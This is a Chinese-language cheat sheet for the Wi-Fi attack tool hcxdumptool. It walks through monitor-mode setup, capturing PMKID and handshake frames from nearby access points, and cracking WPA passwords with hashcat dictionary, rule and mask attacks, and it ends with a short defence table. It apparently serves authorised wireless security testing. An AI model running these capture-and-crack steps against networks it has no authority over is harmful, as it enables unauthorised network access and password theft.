<!-- language-home-navigation -->
[🏠 中文主页](../../README.zh-CN.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# hcxdumptool 备忘单

[hcxdumptool](https://github.com/ZerBea/hcxdumptool) 是一款现代化的高性能命令行 Wi-Fi 攻击和数据包捕获工具。与传统的 Aircrack-ng 工具不同，`hcxdumptool` 无需连接客户端即可捕获 WPA/WPA2/WPA3 PMKID（成对主密钥标识符）帧，捕获 EAPOL 4 次握手，并直接与 `hcxtools` 集成以进行 Hashcat 破解（模式 22000）。

---

## 目录

- [核心优势与现代建筑](#core-advantages--modern-architecture)
- [安装（`hcxdumptool` 和 `hcxtools`）](#installation-hcxdumptool--hcxtools)
- [无线接口设置](#wireless-interface-setup)
- [捕获 PMKID（无客户端攻击）](#capturing-pmkid-clientless-attack)
- [使用 `hcxpcapngtool` 转换捕获](#converting-captures-with-hcxpcapngtool)
- [Hashcat 破解（模式 22000）](#hashcat-cracking-mode-22000)
- [过滤通道和 BSSID](#filtering-channels-and-bssids)
- [防御对策和 WPA3](#defective-countermeasures--wpa3)

---

## 核心优势与现代架构

- **无客户端 PMKID 攻击：** 利用现代路由器中的 RSN IE（稳健安全网络信息元素）PMKID 功能。您**不需要**需要连接的客户端或解除身份验证数据包来捕获密钥材料。
- **统一 Hashcat 模式 22000：** 生成支持 PMKID 和完整 WPA-PBKDF2-PMK 握手的 Hashcat 本机哈希文件。
- **信道跳跃和主动询问：** 传输有针对性的关联请求以从侦听 AP 获取 PMKID。

---

## 安装（`hcxdumptool` 和 `hcxtools`）
```bash
# Debian / Ubuntu / Kali Linux
sudo apt-get update && sudo apt-get install -y hcxdumptool hcxtools

# Arch Linux / BlackArch
sudo pacman -S hcxdumptool hcxtools

# Verify versions
hcxdumptool --version
hcxpcapngtool --version
```
---

## 无线接口设置

在运行 `hcxdumptool` 之前，终止干扰原始数据包注入的后台网络管理服务：
```bash
# 1. Terminate interfering network services (NetworkManager, wpa_supplicant)
sudo systemctl stop NetworkManager
sudo systemctl stop wpa_supplicant

# 2. Put wireless card in monitor mode
sudo ip link set wlan0 down
sudo iw dev wlan0 set type monitor
sudo ip link set wlan0 up

# 3. Verify monitor mode
iw dev
```
---

## 捕获 PMKID（无客户端攻击）

### 1. 所有 2.4GHz 和 5GHz 通道的通用 PMKID 捕获
将所有附近的接入点捕获到 `.pcapng` 文件：
```bash
sudo hcxdumptool -i wlan0 -w capture.pcapng --rds=1
```
- `-i wlan0`：无线监控接口。
- `-w capture.pcapng`：输出捕获文件。
- `--rds=1`：传输RTS帧以提示AP响应。

### 2. 捕获特定目标接入点（BSSID 过滤器）
仅针对授权的 BSSID，以防止影响未经授权的第三方路由器：

1. 创建目标过滤器列表（`target_bssid.txt`）：
```text
001122334455
```
*（不带冒号的 BSSID）*

2. 运行定向捕获：
```bash
sudo hcxdumptool -i wlan0 -w target.pcapng --bpfp=target_bssid.txt -c 6
```
- `-c 6`：锁定注入并监听通道 6。
- `--bpfp`：对目标 BSSID 应用 BPF（伯克利数据包过滤器）列表。

---

## 使用 `hcxpcapngtool` 转换捕获

收集 PMKID 或 EAPOL 帧后，将 `.pcapng` 捕获转换为 Hashcat 兼容格式：
```bash
hcxpcapngtool -o hash.hc22000 -E essid_list.txt capture.pcapng
```
- `-o hash.hc22000`：以现代 Hashcat 格式输出哈希文件。
- `-E essid_list.txt`：将发现的网络名称 (ESSID) 保存到字典中，以进行有针对性的密码破解。
- 该工具报告提取的 PMKID 和 EAPOL 帧总数。

---

## Hashcat破解（模式22000）

模式`22000`是Hashcat统一的WPA-PBKDF2-PMKID + EAPOL破解模式：

### 1.字典攻击
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
```
### 2. 基于规则的变异攻击
```bash
hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```
### 3. 掩码/暴力攻击（8 位数字密码）
```bash
hashcat -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d
```
---

## 过滤通道和 BSSID

通过限制扫描参数优化捕获速度：
```bash
# Scan only specific channels (e.g. 1, 6, 11)
sudo hcxdumptool -i wlan0 -w filtered.pcapng -c 1,6,11
```
---

## 防御对策和 WPA3

|漏洞|攻击机制|防御建议|
|---|---|---|
| **PMKID 缓存** | AP 在 EAPOL 帧 1 中传输 PMKID，无需客户端身份验证 |如果不需要，请禁用 802.11r（快速转换/漫游）；更新路由器固件。 |
| **弱 WPA2 预共享密钥** |离线PBKDF2字典破解（Hashcat模式22000）|强制使用 16 个以上字符的随机密码。 |
| **旧版 WPA2 协议** |容易受到 PMKID 和握手捕获的影响 |升级到 **WPA3-个人 (SAE)**； WPA3 使用前向保密的 Dragonfly 握手，使捕获的帧离线时无法破解。 |